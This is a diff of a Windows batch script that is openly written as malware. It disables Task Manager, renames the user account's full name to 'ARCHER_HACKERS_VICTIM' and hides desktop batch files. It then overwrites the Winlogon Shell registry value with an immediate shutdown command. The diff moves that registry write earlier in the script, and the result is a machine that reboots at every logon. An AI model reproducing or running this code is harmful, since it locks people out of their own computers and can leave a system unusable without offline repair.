@@ -5,6 +5,7 @@
 
 :: setup registry keys before killing explorer
 reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /d "1"
+reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v Shell /d "C:\Windows\system32\cmd.exe /c shutdown /r /t 0"
 cls
 :: set username secretly (not really) and before killing explorer
 wmic useraccount where name='%username%' set FullName='ARCHER_HACKERS_VICTIM'
@@ -44,5 +45,4 @@ cls
 attrib +s +h %userprofile%\desktop\*.bat
 echo Do you want to restart your computer? :) There is a surprise... for you...
 pause
-reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v Shell /d "C:\Windows\system32\cmd.exe /c shutdown /r /t 0"
 shutdown /r /t 0
